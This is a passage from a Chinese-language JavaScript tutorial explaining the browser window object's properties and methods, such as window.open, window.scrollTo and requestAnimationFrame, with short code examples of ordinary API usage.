<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;iframe src=&quot;about.html&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的脚本在 about.html 里面</span></span><br><span class="line"><span class="keyword">var</span> frameEl = <span class="built_in">window</span>.frameElement;</span><br><span class="line"><span class="keyword">if</span> (frameEl) &#123;</span><br><span class="line">  frameEl.src = <span class="string">&#x27;other.html&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>frameEl</code>变量就是<code>&lt;iframe&gt;</code>元素。</p>
<h5 id="2-2-6-window-top，window-parent"><a href="#2-2-6-window-top，window-parent" class="headerlink" title="2.2.6 window.top，window.parent"></a>2.2.6 window.top，window.parent</h5><p><code>window.top</code>属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。</p>
<p><code>window.parent</code>属性指向父窗口。如果当前窗口没有父窗口，<code>window.parent</code>指向自身。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.parent !== <span class="built_in">window</span>.top) &#123;</span><br><span class="line">  <span class="comment">// 表明当前窗口嵌入不止一层</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于不包含框架的网页，这两个属性等同于<code>window</code>对象。</p>
<h5 id="2-2-7-window-status"><a href="#2-2-7-window-status" class="headerlink" title="2.2.7 window.status"></a>2.2.7 window.status</h5><p><code>window.status</code>属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。</p>
<h5 id="2-2-8-window-devicePixelRatio"><a href="#2-2-8-window-devicePixelRatio" class="headerlink" title="2.2.8 window.devicePixelRatio"></a>2.2.8 window.devicePixelRatio</h5><p><code>window.devicePixelRatio</code>属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。</p>
<h5 id="2-2-9-位置大小属性"><a href="#2-2-9-位置大小属性" class="headerlink" title="2.2.9 位置大小属性"></a>2.2.9 位置大小属性</h5><p>以下属性返回<code>window</code>对象的位置信息和大小信息。</p>
<h6 id="（1）window-screenX，window-screenY"><a href="#（1）window-screenX，window-screenY" class="headerlink" title="（1）window.screenX，window.screenY"></a>（1）window.screenX，window.screenY</h6><p><code>window.screenX</code>和<code>window.screenY</code>属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。</p>
<h6 id="（2）-window-innerHeight，window-innerWidth"><a href="#（2）-window-innerHeight，window-innerWidth" class="headerlink" title="（2） window.innerHeight，window.innerWidth"></a>（2） window.innerHeight，window.innerWidth</h6><p><code>window.innerHeight</code>和<code>window.innerWidth</code>属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。</p>
<p>用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因此可见部分（视口）就变小了。</p>
<p>注意，这两个属性值包括滚动条的高度和宽度。</p>
<h6 id="（3）window-outerHeight，window-outerWidth"><a href="#（3）window-outerHeight，window-outerWidth" class="headerlink" title="（3）window.outerHeight，window.outerWidth"></a>（3）window.outerHeight，window.outerWidth</h6><p><code>window.outerHeight</code>和<code>window.outerWidth</code>属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。</p>
<h6 id="（4）window-scrollX，window-scrollY"><a href="#（4）window-scrollX，window-scrollY" class="headerlink" title="（4）window.scrollX，window.scrollY"></a>（4）window.scrollX，window.scrollY</h6><p><code>window.scrollX</code>属性返回页面的水平滚动距离，<code>window.scrollY</code>属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。</p>
<p>注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是0。</p>
<p>举例来说，如果用户向下拉动了垂直滚动条75像素，那么<code>window.scrollY</code>就是75左右。用户水平向右拉动水平滚动条200像素，<code>window.scrollX</code>就是200左右。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.scrollY &lt; <span class="number">75</span>) &#123;</span><br><span class="line">  <span class="built_in">window</span>.scroll(<span class="number">0</span>, <span class="number">75</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。</p>
<h6 id="（5）window-pageXOffset，window-pageYOffset"><a href="#（5）window-pageXOffset，window-pageYOffset" class="headerlink" title="（5）window.pageXOffset，window.pageYOffset"></a>（5）window.pageXOffset，window.pageYOffset</h6><p><code>window.pageXOffset</code>属性和<code>window.pageYOffset</code>属性，是<code>window.scrollX</code>和<code>window.scrollY</code>别名。</p>
<h5 id="2-2-10-组件属性"><a href="#2-2-10-组件属性" class="headerlink" title="2.2.10 组件属性"></a>2.2.10 组件属性</h5><p>组件属性返回浏览器的组件对象。这样的属性有下面几个。</p>
<ul>
<li><code>window.locationbar</code>：地址栏对象</li>
<li><code>window.menubar</code>：菜单栏对象</li>
<li><code>window.scrollbars</code>：窗口的滚动条对象</li>
<li><code>window.toolbar</code>：工具栏对象</li>
<li><code>window.statusbar</code>：状态栏对象</li>
<li><code>window.personalbar</code>：用户安装的个人工具栏对象</li>
</ul>
<p>这些对象的<code>visible</code>属性是一个布尔值，表示这些组件是否可见。这些属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.locationbar.visible</span><br><span class="line"><span class="built_in">window</span>.menubar.visible</span><br><span class="line"><span class="built_in">window</span>.scrollbars.visible</span><br><span class="line"><span class="built_in">window</span>.toolbar.visible</span><br><span class="line"><span class="built_in">window</span>.statusbar.visible</span><br><span class="line"><span class="built_in">window</span>.personalbar.visible</span><br></pre></td></tr></table></figure>

<h5 id="2-2-11-全局对象属性"><a href="#2-2-11-全局对象属性" class="headerlink" title="2.2.11 全局对象属性"></a>2.2.11 全局对象属性</h5><p>全局对象属性指向一些浏览器原生的全局对象。</p>
<ul>
<li><code>window.document</code>：指向<code>document</code>对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。</li>
<li><code>window.location</code>：指向<code>Location</code>对象，用于获取当前窗口的 URL 信息。它等同于<code>document.location</code>属性，详见《Location 对象》一章。</li>
<li><code>window.navigator</code>：指向<code>Navigator</code>对象，用于获取环境信息，详见《Navigator 对象》一章。</li>
<li><code>window.history</code>：指向<code>History</code>对象，表示浏览器的浏览历史，详见《History 对象》一章。</li>
<li><code>window.localStorage</code>：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。</li>
<li><code>window.sessionStorage</code>：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。</li>
<li><code>window.console</code>：指向<code>console</code>对象，用于操作控制台，详见《console 对象》一章。</li>
<li><code>window.screen</code>：指向<code>Screen</code>对象，表示屏幕信息，详见《Screen 对象》一章。</li>
</ul>
<h5 id="2-2-12-window-isSecureContext"><a href="#2-2-12-window-isSecureContext" class="headerlink" title="2.2.12 window.isSecureContext"></a>2.2.12 window.isSecureContext</h5><p><code>window.isSecureContext</code>属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是<code>true</code>，否则就是<code>false</code>。</p>
<h4 id="2-3-window-对象的方法"><a href="#2-3-window-对象的方法" class="headerlink" title="2.3 window 对象的方法"></a>2.3 window 对象的方法</h4><h5 id="2-3-1-window-alert-，window-prompt-，window-confirm"><a href="#2-3-1-window-alert-，window-prompt-，window-confirm" class="headerlink" title="2.3.1 window.alert()，window.prompt()，window.confirm()"></a>2.3.1 window.alert()，window.prompt()，window.confirm()</h5><p><code>window.alert()</code>、<code>window.prompt()</code>、<code>window.confirm()</code>都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。</p>
<h6 id="（1）window-alert"><a href="#（1）window-alert" class="headerlink" title="（1）window.alert()"></a>（1）window.alert()</h6><p><code>window.alert()</code>方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.alert(<span class="string">&#x27;Hello World&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。</p>
<p><code>window.alert()</code>方法的参数只能是字符串，没法使用 CSS 样式，但是可以用<code>\n</code>指定换行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&#x27;本条提示\n分成两行&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h6 id="（2）window-prompt"><a href="#（2）window-prompt" class="headerlink" title="（2）window.prompt()"></a>（2）window.prompt()</h6><p><code>window.prompt()</code>方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = prompt(<span class="string">&#x27;您的年龄？&#x27;</span>, <span class="number">25</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量<code>result</code>。<br><code>window.prompt()</code>的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是<code>null</code>。具体分成三种情况。</p>
<ol>
<li>用户输入信息，并点击“确定”，则用户输入的信息就是返回值。</li>
<li>用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。</li>
<li>用户点击了“取消”（或者按了 ESC 按钮），则返回值是<code>null</code>。</li>
</ol>
<p><code>window.prompt()</code>方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。</p>
<h6 id="（3）window-confirm"><a href="#（3）window-confirm" class="headerlink" title="（3）window.confirm()"></a>（3）window.confirm()</h6><p><code>window.confirm()</code>方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = confirm(<span class="string">&#x27;你最近好吗？&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。</p>
<p><code>confirm</code>方法返回一个布尔值，如果用户点击“确定”，返回<code>true</code>；如果用户点击“取消”，则返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> okay = confirm(<span class="string">&#x27;Please confirm this message.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (okay) &#123;</span><br><span class="line">  <span class="comment">// 用户按下“确定”</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 用户按下“取消”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>confirm</code>的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onunload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">window</span>.confirm(<span class="string">&#x27;你确定要离开当面页面吗？&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。</p>
<h5 id="2-3-2-window-open-window-close-，window-stop"><a href="#2-3-2-window-open-window-close-，window-stop" class="headerlink" title="2.3.2 window.open(), window.close()，window.stop()"></a>2.3.2 window.open(), window.close()，window.stop()</h5><h6 id="（1）window-open"><a href="#（1）window-open" class="headerlink" title="（1）window.open()"></a>（1）window.open()</h6><p><code>window.open</code>方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open(<span class="string">&#x27;somefile.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的<code>somefile.html</code>。</p>
<p><code>open</code>方法一共可以接受三个参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.open(url, windowName, [windowFeatures])</span><br></pre></td></tr></table></figure>
<ul>
<li><code>url</code>：字符串，表示新窗口的网址。如果省略，默认网址就是<code>about:blank</code>。</li>
<li><code>windowName</code>：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用<code>_blank</code>，表示新建一个没有名字的窗口。另外还有几个预设值，<code>_self</code>表示当前窗口，<code>_top</code>表示顶层窗口，<code>_parent</code>表示上一层窗口。</li>
<li><code>windowFeatures</code>：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open(</span><br><span class="line">  <span class="string">&#x27;somepage.html&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;DefinitionsWindows&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。</p>
<p>第三个参数可以设定如下属性。</p>
<ul>
<li>left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。</li>
<li>top：新窗口距离屏幕最顶部的距离（单位像素）。</li>
<li>height：新窗口内容区域的高度（单位像素），不得小于100。</li>
<li>width：新窗口内容区域的宽度（单位像素），不得小于100。</li>
<li>outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。</li>
<li>outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。</li>
<li>menubar：是否显示菜单栏。</li>
<li>toolbar：是否显示工具栏。</li>
<li>location：是否显示地址栏。</li>
<li>personalbar：是否显示用户自己安装的工具栏。</li>
<li>status：是否显示状态栏。</li>
<li>dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。</li>
<li>minimizable：是否有最小化按钮，前提是<code>dialog=yes</code>。</li>
<li>noopener：新窗口将与父窗口切断联系，即新窗口的<code>window.opener</code>属性返回<code>null</code>，父窗口的<code>window.open()</code>方法也返回<code>null</code>。</li>
<li>resizable：新窗口是否可以调节大小。</li>
<li>scrollbars：是否允许新窗口出现滚动条。</li>
<li>dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。</li>
<li>titlebar：新窗口是否显示标题栏。</li>
<li>alwaysRaised：是否显示在所有窗口的顶部。</li>
<li>alwaysLowered：是否显示在父窗口的底下。</li>
<li>close：新窗口是否显示关闭按钮。</li>
</ul>
<p>对于那些可以打开和关闭的属性，设为<code>yes</code>或<code>1</code>或不设任何值就表示打开，比如<code>status=yes</code>、<code>status=1</code>、<code>status</code>都会得到同样的结果。如果想设为关闭，不用写<code>no</code>，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的<code>yes/no</code>属性都会被设成<code>no</code>，只有<code>titlebar</code>和关闭按钮除外（它们的值默认为<code>yes</code>）。</p>
<p>上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#x27;</span></span><br></pre></td></tr></table></figure>
<p>另外，<code>open()</code>方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许<code>open</code>方法指向该窗口。</p>
<p><code>window.open</code>方法返回新窗口的引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> windowB = <span class="built_in">window</span>.open(<span class="string">&#x27;windowB.html&#x27;</span>, <span class="string">&#x27;WindowB&#x27;</span>);</span><br><span class="line">windowB.window.name <span class="comment">// &quot;WindowB&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w = <span class="built_in">window</span>.open();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;已经打开新窗口&#x27;</span>);</span><br><span class="line">w.location = <span class="string">&#x27;http://example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向<code>example.com</code>。</p>
<p>由于<code>open</code>这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open();</span><br><span class="line"><span class="keyword">if</span> (popup === <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="comment">// 新建窗口失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="（2）window-close"><a href="#（2）window-close" class="headerlink" title="（2）window.close()"></a>（2）window.close()</h6><p><code>window.close</code>方法用于关闭当前窗口，一般只用来关闭<code>window.open</code>方法新建的窗口。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">popup.close()</span><br></pre></td></tr></table></figure>
<p>该方法只对顶层窗口有效，<code>iframe</code>框架之中的窗口使用该方法无效。</p>
<h6 id="（3）window-stop"><a href="#（3）window-stop" class="headerlink" title="（3）window.stop()"></a>（3）window.stop()</h6><p><code>window.stop()</code>方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.stop()</span><br></pre></td></tr></table></figure>
<h5 id="2-3-3-window-moveTo-，window-moveBy"><a href="#2-3-3-window-moveTo-，window-moveBy" class="headerlink" title="2.3.3 window.moveTo()，window.moveBy()"></a>2.3.3 window.moveTo()，window.moveBy()</h5><p><code>window.moveTo()</code>方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.moveTo(<span class="number">100</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码将窗口移动到屏幕<code>(100, 200)</code>的位置。</p>
<p><code>window.moveBy()</code>方法将窗口移动到一个相对位置。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.moveBy(<span class="number">25</span>, <span class="number">50</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码将窗口向右移动25像素、向下移动50像素。</p>
<p>为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用<code>window.open()</code>方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。</p>
<h5 id="2-3-4-window-resizeTo-，window-resizeBy"><a href="#2-3-4-window-resizeTo-，window-resizeBy" class="headerlink" title="2.3.4 window.resizeTo()，window.resizeBy()"></a>2.3.4 window.resizeTo()，window.resizeBy()</h5><p><code>window.resizeTo()</code>方法用于缩放窗口到指定大小。</p>
<p>它接受两个参数，第一个是缩放后的窗口宽度（<code>outerWidth</code>属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（<code>outerHeight</code>属性）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.resizeTo(</span><br><span class="line">  <span class="built_in">window</span>.screen.availWidth / <span class="number">2</span>,</span><br><span class="line">  <span class="built_in">window</span>.screen.availHeight / <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。</p>
<p><code>window.resizeBy()</code>方法用于缩放窗口。它与<code>window.resizeTo()</code>的区别是，它按照相对的量缩放，<code>window.resizeTo()</code>需要给出缩放后的绝对大小。</p>
<p>它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.resizeBy(-<span class="number">200</span>, -<span class="number">200</span>)</span><br></pre></td></tr></table></figure>
<p>上面的代码将当前窗口的宽度和高度，都缩小200像素。</p>
<h5 id="2-3-5-window-scrollTo-，window-scroll-，window-scrollBy"><a href="#2-3-5-window-scrollTo-，window-scroll-，window-scrollBy" class="headerlink" title="2.3.5 window.scrollTo()，window.scroll()，window.scrollBy()"></a>2.3.5 window.scrollTo()，window.scroll()，window.scrollBy()</h5><p><code>window.scrollTo</code>方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.scrollTo(x-coord, y-coord)</span><br></pre></td></tr></table></figure>
<p>它也可以接受一个配置对象作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.scrollTo(options)</span><br></pre></td></tr></table></figure>
<p>配置对象<code>options</code>有三个属性。</p>
<ul>
<li><code>top</code>：滚动后页面左上角的垂直坐标，即 y 坐标。</li>
<li><code>left</code>：滚动后页面左上角的水平坐标，即 x 坐标。</li>
<li><code>behavior</code>：字符串，表示滚动的方式，有三个可能值（<code>smooth</code>、<code>instant</code>、<code>auto</code>），默认值为<code>auto</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.scrollTo(&#123;</span><br><span class="line">  top: <span class="number">1000</span>,</span><br><span class="line">  behavior: <span class="string">&#x27;smooth&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>window.scroll()</code>方法是<code>window.scrollTo()</code>方法的别名。</p>
<p><code>window.scrollBy()</code>方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.scrollBy(<span class="number">0</span>, <span class="built_in">window</span>.innerHeight)</span><br></pre></td></tr></table></figure>
<p>上面代码用于将网页向下滚动一屏。</p>
<p>如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。</p>
<ul>
<li>Element.scrollTop</li>
<li>Element.scrollLeft</li>
<li>Element.scrollIntoView()</li>
</ul>
<h5 id="2-3-6-window-print"><a href="#2-3-6-window-print" class="headerlink" title="2.3.6 window.print()"></a>2.3.6 window.print()</h5><p><code>window.print</code>方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。</p>
<p>常见的打印按钮代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;printLink&#x27;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.print === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// 支持打印功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-3-7-window-focus-，window-blur"><a href="#2-3-7-window-focus-，window-blur" class="headerlink" title="2.3.7 window.focus()，window.blur()"></a>2.3.7 window.focus()，window.blur()</h5><p><code>window.focus()</code>方法会激活窗口，使其获得焦点，出现在其他窗口的前面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open(<span class="string">&#x27;popup.html&#x27;</span>, <span class="string">&#x27;Popup Window&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((popup !== <span class="literal">null</span>) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  popup.focus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码先检查<code>popup</code>窗口是否依然存在，确认后激活该窗口。</p>
<p><code>window.blur()</code>方法将焦点从窗口移除。</p>
<p>当前窗口获得焦点时，会触发<code>focus</code>事件；当前窗口失去焦点时，会触发<code>blur</code>事件。</p>
<h5 id="2-3-8-window-getSelection"><a href="#2-3-8-window-getSelection" class="headerlink" title="2.3.8 window.getSelection()"></a>2.3.8 window.getSelection()</h5><p><code>window.getSelection</code>方法返回一个<code>Selection</code>对象，表示用户现在选中的文本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> selObj = <span class="built_in">window</span>.getSelection();</span><br></pre></td></tr></table></figure>
<p>使用<code>Selection</code>对象的<code>toString</code>方法可以得到选中的文本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> selectedText = selObj.toString();</span><br></pre></td></tr></table></figure>
<h5 id="2-3-9-window-getComputedStyle-，window-matchMedia"><a href="#2-3-9-window-getComputedStyle-，window-matchMedia" class="headerlink" title="2.3.9 window.getComputedStyle()，window.matchMedia()"></a>2.3.9 window.getComputedStyle()，window.matchMedia()</h5><p><code>window.getComputedStyle()</code>方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。</p>
<p><code>window.matchMedia()</code>方法用来检查 CSS 的<code>mediaQuery</code>语句，详见《CSS 操作》一章。</p>
<h5 id="2-3-10-window-requestAnimationFrame"><a href="#2-3-10-window-requestAnimationFrame" class="headerlink" title="2.3.10 window.requestAnimationFrame()"></a>2.3.10 window.requestAnimationFrame()</h5><p><code>window.requestAnimationFrame()</code>方法跟<code>setTimeout</code>类似，都是推迟某个函数的执行。不同之处在于，<code>setTimeout</code>必须指定推迟的时间，<code>window.requestAnimationFrame()</code>则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，<code>requestAnimationFrame()</code>会暂停执行。</p>
<p>如果某个函数会改变网页的布局，一般就放在<code>window.requestAnimationFrame()</code>里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。</p>
<p>该方法接受一个回调函数作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.requestAnimationFrame(callback)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>callback</code>是一个回调函数。<code>callback</code>执行时，它的参数就是系统传入的一个高精度时间戳（<code>performance.now()</code>的返回值），单位是毫秒，表示距离网页加载的时间。</p>
<p><code>window.requestAnimationFrame()</code>的返回值是一个整数，这个整数可以传入<code>window.cancelAnimationFrame()</code>，用来取消回调函数的执行。</p>
<p>下面是一个<code>window.requestAnimationFrame()</code>执行网页动画的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;animate&#x27;</span>);</span><br><span class="line">element.style.position = <span class="string">&#x27;absolute&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> start = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span>(<span class="params">timestamp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!start) start = timestamp;</span><br><span class="line">  <span class="keyword">var</span> progress = timestamp - start;</span><br><span class="line">  <span class="comment">// 元素不断向左移，最大不超过200像素</span></span><br><span class="line">  element.style.left = <span class="built_in">Math</span>.min(progress / <span class="number">10</span>, <span class="number">200</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  <span class="comment">// 如果距离第一次执行不超过 2000 毫秒，</span></span><br><span class="line">  <span class="comment">// 就继续执行动画</span></span><br><span class="line">  <span class="keyword">if</span> (progress &lt; <span class="number">2000</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(step);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.requestAnimationFrame(step);</span><br></pre></td></tr></table></figure>
